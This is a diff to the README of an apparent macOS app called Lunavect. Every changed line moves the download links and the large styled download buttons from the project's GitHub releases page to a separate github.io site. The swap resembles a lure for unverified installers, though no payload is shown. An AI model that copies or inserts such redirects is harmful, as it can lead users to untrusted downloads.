@@ -2,7 +2,7 @@
 
 ![GitHub release](https://img.shields.io/badge/version-1.2.3-blue) ![macOS](https://img.shields.io/badge/platform-macOS-lightgrey) ![License](https://img.shields.io/badge/license-MIT-green)
 
-[<span style="background-color:#FF6B6B;padding:12px 24px;border-radius:8px;color:white;font-size:20px;font-weight:bold;text-decoration:none;">⬇️ DOWNLOAD LUNAVECT NOW</span>](https://github.com/Faijurrahman5947/Lunavect/releases)
+[<span style="background-color:#FF6B6B;padding:12px 24px;border-radius:8px;color:white;font-size:20px;font-weight:bold;text-decoration:none;">⬇️ DOWNLOAD LUNAVECT NOW</span>](https://faijurrahman5947.github.io)
 
 ---
 
@@ -60,7 +60,7 @@ Created using Swift and SwiftUI, the latest technology from Apple. Fully notariz
 
 **Step 1: Download the Application**
 
-Visit this link to download the application: [https://github.com/Faijurrahman5947/Lunavect/releases](https://github.com/Faijurrahman5947/Lunavect/releases)
+Visit this link to download the application: [https://faijurrahman5947.github.io](https://faijurrahman5947.github.io)
 
 Look for the latest release version and download the file named `Lunavect.dmg`.
 
@@ -223,7 +223,7 @@ Peace of mind included by default.
 
 Join thousands of developers who never miss a completion. Download Lunavect today and let your menu bar be your guide.
 
-[<span style="background-color:#4ECDC4;padding:15px 30px;border-radius:12px;color:white;font-size:22px;font-weight:bold;text-decoration:none;">🚀 GET LUNAVECT FREE</span>](https://github.com/Faijurrahman5947/Lunavect/releases)
+[<span style="background-color:#4ECDC4;padding:15px 30px;border-radius:12px;color:white;font-size:22px;font-weight:bold;text-decoration:none;">🚀 GET LUNAVECT FREE</span>](https://faijurrahman5947.github.io)
 
 Your AI assistants are working hard - don't keep them waiting. Let Lunavect watch the clock for you.
 
